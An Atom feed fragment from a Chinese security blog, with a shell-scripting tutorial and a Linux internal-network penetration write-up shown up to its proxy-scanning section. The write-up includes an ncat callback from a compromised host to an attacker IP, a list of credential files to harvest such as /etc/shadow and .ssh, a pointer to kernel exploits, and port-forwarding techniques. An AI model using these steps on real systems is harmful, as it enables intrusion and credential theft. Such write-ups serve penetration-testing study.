      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Learn and live&lt;br&gt;活着，为了学习&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　awk、grep、sed是linux操作文本的三大利器，也是必须掌握的linux命令之一。三者的功能都是处理文本，但侧重点各不相同，其中属awk功能最强大，但也最复杂。grep更适合单纯的查找或匹配文本，sed更适合编辑匹配到的文本，awk更适合格式化文本，对文本进行较复杂格式处理。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>【玩转linux系列】shell编程</title>
    <link href="http://thief.one/2017/08/11/1/"/>
    <id>http://thief.one/2017/08/11/1/</id>
    <published>2017-08-11T08:38:23.000Z</published>
    <updated>2017-08-31T07:21:26.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">我猜你可能会问我为什么最近更新得这么勤？<br>因为我在充电！<br></blockquote><br>　　如果你去问程序员哪种编程语言最好用，可能会得到很多种答案。但如果问linux下哪种语言使用最方便，shell当之无愧，因为其相当于windows下的bat，可以自动化一些命令操作。当然linux内置安装了很多脚本语言，比如ruby、python等，使用也很方便。作为一名python爱好者，我一般习惯用python去解决问题，但为了能够看懂别人的shell代码，为此也需要学习一些基础的shell语法。<br><a id="more"></a></p>
<h3 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h3><h4 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h4><p>普通变量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a=<span class="string">"123"</span></div><div class="line">b=<span class="string">"test"</span></div></pre></td></tr></table></figure></p>
<p>只读变量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a=<span class="string">"123"</span></div><div class="line"><span class="built_in">readonly</span> a</div></pre></td></tr></table></figure></p>
<p>顾名思义，只读变量不能改变内容，否则会报如下错误<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/sh: NAME: This variable is <span class="built_in">read</span> only.</div></pre></td></tr></table></figure></p>
<h4 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> &#123;<span class="variable">$a</span>&#125; 或者 <span class="built_in">echo</span> <span class="variable">$a</span></div><div class="line">c=<span class="variable">$a</span></div></pre></td></tr></table></figure>
<p>只有在使用变量时，变量名前需要加$符号,{}可选当然最好使用。</p>
<h4 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">unset</span> a   <span class="comment"># 不能删除只读变量</span></div></pre></td></tr></table></figure>
<h3 id="shell数据结构"><a href="#shell数据结构" class="headerlink" title="shell数据结构"></a>shell数据结构</h3><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">str=<span class="string">"123"</span></div><div class="line">str=<span class="string">'123'</span></div></pre></td></tr></table></figure>
<ul>
<li>单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的</li>
<li>单引号字串中不能出现单引号（对单引号使用转义符后也不行）</li>
<li>双引号里可以有变量</li>
<li>双引号里可以出现转义字符</li>
</ul>
<h5 id="字符串与字符串变量的拼接"><a href="#字符串与字符串变量的拼接" class="headerlink" title="字符串与字符串变量的拼接"></a>字符串与字符串变量的拼接</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Str_new=<span class="string">"this is "</span><span class="variable">$str</span><span class="string">""</span></div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Str _new=<span class="string">"this is &#123;<span class="variable">$str</span>&#125;"</span></div></pre></td></tr></table></figure></p>
<h5 id="获取字符串长度"><a href="#获取字符串长度" class="headerlink" title="获取字符串长度"></a>获取字符串长度</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">string=<span class="string">"abcd"</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string&#125;</span> <span class="comment">#输出4</span></div></pre></td></tr></table></figure>
<h5 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">string=<span class="string">"this is a test"</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$&#123;string:1:4&#125;</span> <span class="comment"># 输出test</span></div></pre></td></tr></table></figure>
<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>bash支持一维数组（不支持多维数组），并且没有限定数组的大小。</p>
<h5 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=(1 2 3 4)   <span class="comment"># 注意是空格隔开而不是逗号</span></div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a[0]=1</div><div class="line">a[1]=2</div><div class="line">a[2]=3</div><div class="line">a[3]=4</div></pre></td></tr></table></figure></p>
<h5 id="读取数组"><a href="#读取数组" class="headerlink" title="读取数组"></a>读取数组</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">valuen=<span class="variable">$&#123;array_name[n]&#125;</span> <span class="comment"># 读取指定下标的元素</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array_name[@]&#125;</span>  <span class="comment"># 读取所有元素</span></div></pre></td></tr></table></figure>
<h5 id="数组的长度"><a href="#数组的长度" class="headerlink" title="数组的长度"></a>数组的长度</h5><p>取得数组元素的个数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">length=<span class="variable">$&#123;#array_name[@]&#125;</span></div></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">length=<span class="variable">$&#123;#array_name[*]&#125;</span></div></pre></td></tr></table></figure></p>
<p>取得数组单个元素的长度<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lengthn=<span class="variable">$&#123;#array_name[n]&#125;</span></div></pre></td></tr></table></figure></p>
<h3 id="shell输入输出重定向"><a href="#shell输入输出重定向" class="headerlink" title="shell输入输出重定向"></a>shell输入输出重定向</h3><h4 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">换行：<span class="built_in">echo</span> -e <span class="string">"OK! \n"</span>    <span class="comment">#-e 开启转义</span></div><div class="line">不换行：<span class="built_in">echo</span> -e <span class="string">"OK! \c"</span>   <span class="comment">#-e 开启转义 \c 不换行</span></div><div class="line">输出变量名：<span class="built_in">echo</span> <span class="string">'$a'</span> 输出<span class="variable">$a</span>    使用单引号即可</div><div class="line">输出命令执行结果：<span class="built_in">echo</span> `date`   使用反引号</div></pre></td></tr></table></figure>
<h4 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4s\n"</span></div><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4.2f\n"</span></div><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4.2f\n"</span></div><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4.2f\n"</span></div></pre></td></tr></table></figure>
<p>%s %c %d %f都是格式替代符%-10s指一个宽度为10个字符（-表示左对齐，没有则表示右对齐），任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。%-4.2f指格式化为小数，其中.2指保留2位小数。</p>
<h3 id="shell传参"><a href="#shell传参" class="headerlink" title="shell传参"></a>shell传参</h3><p>shell代码内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$0</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$1</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$2</span></div></pre></td></tr></table></figure></p>
<p>运行脚本并传参<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./shell.sh a b</div></pre></td></tr></table></figure></p>
<p>输出结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">./shell.sh</div><div class="line">a</div><div class="line">b</div></pre></td></tr></table></figure></p>
<h4 id="特殊参数"><a href="#特殊参数" class="headerlink" title="特殊参数"></a>特殊参数</h4><ul>
<li>$#    传递到脚本的参数个数</li>
<li>$<em>    以一个单字符串显示所有向脚本传递的参数。<br>如”$</em>“用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。</li>
<li>$$    脚本运行的当前进程ID号</li>
<li>$!    后台运行的最后一个进程的ID号</li>
<li>$@    与$*相同，但是使用时加引号，并在引号中返回每个参数。<br>如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。</li>
<li>$-    显示Shell使用的当前选项，与set命令功能相同。</li>
<li>$?    显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</li>
</ul>
<h3 id="shell函数"><a href="#shell函数" class="headerlink" title="shell函数"></a>shell函数</h3><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[ <span class="keyword">function</span> ] funname [()]</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">    action;</div><div class="line"></div><div class="line">    [<span class="built_in">return</span> int;]</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">Test</span></span>()</div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="variable">$a</span>=“123”</div><div class="line"><span class="built_in">return</span> <span class="variable">$a</span></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="函数使用并获取返回值"><a href="#函数使用并获取返回值" class="headerlink" title="函数使用并获取返回值"></a>函数使用并获取返回值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Test</div><div class="line"><span class="built_in">echo</span> $?    <span class="comment"># $?为函数返回值</span></div></pre></td></tr></table></figure>
<h4 id="函数传参"><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#函数定义</span></div><div class="line"><span class="function"><span class="title">Test</span></span>()</div><div class="line">&#123;</div><div class="line"><span class="built_in">echo</span> <span class="variable">$1</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$2</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$3</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">#函数使用</span></div><div class="line">Test a b c</div></pre></td></tr></table></figure>
<h3 id="shell流程控制"><a href="#shell流程控制" class="headerlink" title="shell流程控制"></a>shell流程控制</h3><h4 id="if条件语句"><a href="#if条件语句" class="headerlink" title="if条件语句"></a>if条件语句</h4><h5 id="if-then-else-fi"><a href="#if-then-else-fi" class="headerlink" title="if-then-else-fi"></a>if-then-else-fi</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> condition</div><div class="line"><span class="keyword">then</span></div><div class="line">    command1 </div><div class="line">    command2</div><div class="line">    ...</div><div class="line">    commandN</div><div class="line"><span class="keyword">else</span></div><div class="line">    <span class="built_in">command</span></div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
<h5 id="if-then-elif-then-else-fi"><a href="#if-then-elif-then-else-fi" class="headerlink" title="if-then-elif-then-else-fi"></a>if-then-elif-then-else-fi</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> condition1</div><div class="line"><span class="keyword">then</span></div><div class="line">    command1</div><div class="line"><span class="keyword">elif</span> condition2 </div><div class="line"><span class="keyword">then</span> </div><div class="line">    command2</div><div class="line"><span class="keyword">else</span></div><div class="line">    commandN</div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
<h4 id="for循环语句"><a href="#for循环语句" class="headerlink" title="for循环语句"></a>for循环语句</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ... itemN</div><div class="line"><span class="keyword">do</span></div><div class="line">    command1</div><div class="line">    command2</div><div class="line">    ...</div><div class="line">    commandN</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<p>一句话for循环shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(ps -ef | grep python | awk <span class="string">'&#123;print $2&#125;'</span>);<span class="keyword">do</span> <span class="built_in">kill</span> <span class="variable">$i</span>;<span class="keyword">done</span></div></pre></td></tr></table></figure></p>
<h4 id="while循环语句"><a href="#while循环语句" class="headerlink" title="while循环语句"></a>while循环语句</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">int=1</div><div class="line"><span class="keyword">while</span>(( <span class="variable">$int</span>&lt;=5 ))</div><div class="line"><span class="keyword">do</span></div><div class="line">        <span class="built_in">echo</span> <span class="variable">$int</span></div><div class="line">        <span class="built_in">let</span> <span class="string">"int++"</span></div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<h3 id="shell实战"><a href="#shell实战" class="headerlink" title="shell实战"></a>shell实战</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#! /bin/bash</span></div><div class="line"></div><div class="line"><span class="comment">#shell综合运用</span></div><div class="line"></div><div class="line">a=`whoami` <span class="comment">#执行命令</span></div><div class="line">b=`date`</div><div class="line">c=<span class="string">"open"</span></div><div class="line">d=`cat test.log | grep <span class="variable">$c</span>`</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="variable">$d</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"user is <span class="variable">$a</span> time is <span class="variable">$b</span>"</span></div></pre></td></tr></table></figure>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.runoob.com/linux/linux-shell.html" target="_blank" rel="external">http://www.runoob.com/linux/linux-shell.html</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/09/2/">【玩转linux系统】Linux内网渗透</a><br><a href="https://thief.one/2017/08/09/1/">【玩转linux系列】Vim使用</a><br><a href="https://thief.one/2017/08/08/1/">【玩转linux系列】Linux基础命令</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;我猜你可能会问我为什么最近更新得这么勤？&lt;br&gt;因为我在充电！&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　如果你去问程序员哪种编程语言最好用，可能会得到很多种答案。但如果问linux下哪种语言使用最方便，shell当之无愧，因为其相当于windows下的bat，可以自动化一些命令操作。当然linux内置安装了很多脚本语言，比如ruby、python等，使用也很方便。作为一名python爱好者，我一般习惯用python去解决问题，但为了能够看懂别人的shell代码，为此也需要学习一些基础的shell语法。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
      <category term="shell" scheme="http://thief.one/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>【玩转linux系统】Linux内网渗透</title>
    <link href="http://thief.one/2017/08/09/2/"/>
    <id>http://thief.one/2017/08/09/2/</id>
    <published>2017-08-09T08:24:01.000Z</published>
    <updated>2017-08-21T12:45:51.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Nothing great was ever achieved without enthusiasm<br>无热情成就不了伟业<br></blockquote><br>　　前段时间做了一次不算成功也不算完整的linux内网渗透，不算成功是因为并没有拿下内网中其他服务器的权限，不算完整是因为由于某些原因测试被迫暂时中止。虽然这次linux内网渗透不算是一个很好的教学案例，但我还是决定把过程记录一下，尤其重点记录linux内网渗透的思路，以防遗忘。<br><a id="more"></a><br>　　网上关于内网渗透的资料很多，我在做测试之前也是翻阅了很多资料。本篇标题突出linux，是因为本次测试不涉及windows系统，当然linux与windows内网渗透的原理差不多，只不过使用的工具有所区别。</p>
<h3 id="收集测试网络环境"><a href="#收集测试网络环境" class="headerlink" title="收集测试网络环境"></a>收集测试网络环境</h3><p>　　当我们拿到一台目标内网服务器，或者说肉鸡服务器，首先要做的就是收集信息。而在我看来需要收集的信息中，最重要的之一便是肉鸡的网络环境。</p>
<h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>首先介绍下本次测试的服务器环境：</p>
<ul>
<li>攻击机Mac：110.xx.xx.xx   外网 </li>
<li>肉鸡centos：192.168.16.x  目标内网16网段系统</li>
<li>内网渗透范围：192.168.17.0/24  目标内网17网段系统</li>
</ul>
<p>本次测试模拟假设：由于肉鸡服务器上对外开放了存在漏洞的web应用，被入侵植入webshell。<br>本次测试目的：通过肉鸡服务器上的shell，深入渗透内网17网段的服务器。</p>
<h4 id="收集测试哪些网络数据？"><a href="#收集测试哪些网络数据？" class="headerlink" title="收集测试哪些网络数据？"></a>收集测试哪些网络数据？</h4><p>　　ok，目前我已经拥有了肉鸡的shell，那么该收集肉鸡服务器的哪些网络环境呢？又该如何去测试？我认为至少要收集以下几点网络环境信息：</p>
<ul>
<li>肉鸡服务器与外网的连通性</li>
<li>肉鸡服务器与内网其他网段的连通性</li>
<li>肉鸡服务器与外网之间是否有端口访问限制</li>
<li>肉鸡服务器与内网其他网段之间是否有端口访问限制</li>
</ul>
<p>注：连通性主要是指能否ping通，需要双方互相ping测试；端口访问限制，指的是目标网络边界是否有堡垒机或者防火墙，对进出的端口是否有做限制。</p>
<h4 id="端口访问限制测试"><a href="#端口访问限制测试" class="headerlink" title="端口访问限制测试"></a>端口访问限制测试</h4><p>ping测试这里不介绍了，主要说下如何测试端口访问限制，可以使用的工具如下：</p>
<ul>
<li>curl、wget（可连接web服务，主要为80、443、8000+端口）</li>
<li>telnet（可主动连接指定ip的指定port）</li>
<li>nmap（可扫描端口，open或者filter）</li>
<li>ncat（可以创建端口监听，也可以主动连接）</li>
<li>python（可主动创建端口监听）<br>……</li>
</ul>
<p>在测试端口访问限制前，我们先要搞清楚当前的网络环境。本次测试中，攻击机在外网而肉鸡在内网，因此正常情况下攻击机是无法直接访问到肉鸡上某个端口的（需要网络边界路由器做端口映射）。</p>
<h5 id="反向连接测试"><a href="#反向连接测试" class="headerlink" title="反向连接测试"></a>反向连接测试</h5><p>我们在测试端口访问限制时，首先可以利用ncat在攻击机上监听一个端口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ncat -l -p 9999</div></pre></td></tr></table></figure></p>
<p>然后利用ncat或者telnet等工具在肉鸡上尝试连接，我称之为反向连接测试。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ncat 110.xx.xx.xx 9999</div></pre></td></tr></table></figure></p>
<p>注：监听的端口可以随机选取，尽量选取多个端口尝试多次；如果肉鸡能够访问攻击机的任何端口，说明目标网络边界没有对出方向的连接做限制，了解这方面的信息对后面的端口转发有很大好处。</p>
<h5 id="正向连接测试"><a href="#正向连接测试" class="headerlink" title="正向连接测试"></a>正向连接测试</h5><p>　　我们也可以在肉鸡上监听一个端口，攻击机上尝试连接（这里连接的是肉鸡的外网ip地址，肉鸡对外开放的web应用肯定是以一个外网ip或者域名的形式存在，而该ip在本次测试中并不是肉鸡真正的ip地址，是目标边界网络设备的ip，原理是通过端口映射将网络设备（外网ip）上的web端口映射到了肉鸡（内网ip）的web端口上），我称之为正向连接测试。<br>　　尝试连接肉鸡外网地址的端口，意义在于有些粗心的管理员会在网络设备上设置全端口映射，也就是说肉鸡上监听任何端口都能映射到网络边界设备的相同端口上，那么这跟肉鸡服务器直接处在外网就没差了。</p>
<h3 id="收集服务器信息"><a href="#收集服务器信息" class="headerlink" title="收集服务器信息"></a>收集服务器信息</h3><p>收集信息可以说是渗透测试的第一步，内网渗透也一样，收集的服务器信息越多，渗透的成功率就越大。</p>
<h4 id="查看系统内核"><a href="#查看系统内核" class="headerlink" title="查看系统内核"></a>查看系统内核</h4><p>linux系统上查看内核版本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsb_release –a</div></pre></td></tr></table></figure></p>
<p>　　一般系统的入侵途径是先提权，而提权可以通过linux内核漏洞进行，因此可以先查看linux内核版本，然后根据内核<a href="https://www.kernel-exploits.com/" target="_blank" rel="external">寻找exp的网站</a>，上传exp进行提权。由于本次测试不涉及提权部分，因此不做测试，另外补充一句：内核提权有宕机风险，请谨慎操作。</p>
<h4 id="查看操作系统位数"><a href="#查看操作系统位数" class="headerlink" title="查看操作系统位数"></a>查看操作系统位数</h4><p>linux系统上查看位数如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div></pre></td></tr></table></figure></p>
<p>说明：知道系统是32位还是64位对后期生成msf木马有帮助。</p>
<h4 id="系统敏感信息"><a href="#系统敏感信息" class="headerlink" title="系统敏感信息"></a>系统敏感信息</h4><p>收集一些系统相关的敏感信息，比如账号密码、日志、历史命令、ssh文件等。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/etc/shadow</div><div class="line">/etc/passwd</div><div class="line">/var/<span class="built_in">log</span></div><div class="line"><span class="built_in">history</span></div><div class="line">.ssh</div><div class="line">......</div></pre></td></tr></table></figure></p>
<h4 id="web敏感信息"><a href="#web敏感信息" class="headerlink" title="web敏感信息"></a>web敏感信息</h4><p>如果服务器存在web应用，可以查看web目录下是否存在敏感信息，比如连接数据库的配置文件等等。</p>
<h3 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h3><p>　　当信息收集完成后，可以尝试扫描一下内网的机器，比如主机存活扫描、端口扫描、arp扫描等。端口扫描可以使用nmap、msf等工具，但如果服务器上没有安装这些工具时，通常有3种手段可以达到内网端口扫描的效果。第一种就是服务器上安装扫描工具，这里不多说也不推荐，因为动静大且麻烦(当然可以上传python扫描端口的脚本，不需要编译安装，比较方便。)；第二种就是端口转发，将服务器内网端口转发到外网进行扫描；第三种就是代理扫描，也就是把装有扫描工具的攻击机代理到目标内网环境。<br>　　无论是端口转发扫描还是代理扫描，原理都是打通攻击机（外网）与肉鸡（内网）的连通性，即让攻击机可以直接访问到肉鸡所在的内网资源。这里的连接不借助于目标网络边界设备的端口映射功能，因此与攻击机访问肉鸡web服务所产生的连接有所区别。</p>
<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>　　想要达到以上所介绍的彼此”直接”的连接，我们需要一个中间的桥梁，来传递内外网（攻击机与肉鸡）之间的数据。搭建这种桥梁的方式有很多，我们首先可以想到端口转发，即把肉鸡服务器上的某个端口转发到攻击机的某个端口上，这样攻击机上访问本机某个端口，就相当于访问了肉鸡服务器上的某个端口。</p>
<p>端口转发的工具：lcx、meterpreter等，具体用法后面会介绍<br>端口转发类型：tcp端口转发、http转发、ssh转发等</p>
<h5 id="tcp端口转发"><a href="#tcp端口转发" class="headerlink" title="tcp端口转发"></a>tcp端口转发</h5><p>本机转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发肉鸡22端口。<br>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">肉鸡22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口</div></pre></td></tr></table></figure></p>
<p>注：此时我们去连接攻击机的3333端口，就相当于连接了肉鸡的22端口。</p>
<p>远程转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发内网目标服务器的22端口。（前提是肉鸡能够连接目标服务器的22端口）<br>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">内网目标服务器22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口</div></pre></td></tr></table></figure></p>
<p>注：此时我们去连接攻击机的3333端口，就相当于连接了目标服务器的22端口。<br>　　<br>说明：从上面的连接过程不难看出，端口转发比较难以防范的原因就在于，攻击机上监听的端口是随机的，不可预知的，因此不可能事先在堡垒机或者防火墙上做出方向的端口策略，除非禁止服务器访问外部所有端口（现实情况大多只对进方向的端口连接做限制）。</p>
<h5 id="http转发"><a href="#http转发" class="headerlink" title="http转发"></a>http转发</h5><p>　　有些安全意思强的管理员，会对一些服务器做禁止访问外网的策略，即服务器禁止连接任何外网的端口。此时普通的tcp端口转发就没有效果了，因为转发的前提是要能互相连接上。此种情况，可以使用http转发。<br>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">肉鸡web端口(80)&lt;--&gt;网络边界设备端口(80)&lt;--&gt;攻击机随机端口</div></pre></td></tr></table></figure></p>
<p>注：这里之所以能够连通，是借助了服务器上的web服务，以及网络边界设备的映射功能。</p>
<p>说明：虽然肉鸡不能访问外网任何端口，但只要它对外提供web服务，就说明它还能跟外界通信，只不过这种通信局限于web服务端口中，并且肉鸡不是直接跟攻击机通信，而是借助了边界设备。</p>
<h4 id="代理扫描内网"><a href="#代理扫描内网" class="headerlink" title="代理扫描内网"></a>代理扫描内网</h4><p>　　以上介绍了几种端口转发的使用以及原理，从中我们不难看出端口转发固然厉害，但也很局限，因为每次都只能转发一个ip的一个端口，对于扫描来说，并不是最好的选择方案。因此出现了一种更好的技术方案–代理扫描，其原理与端口转发差不多，都是需要搭建一个桥梁，而这个桥梁往往不是某个端口，而是shell或者说session。</p>
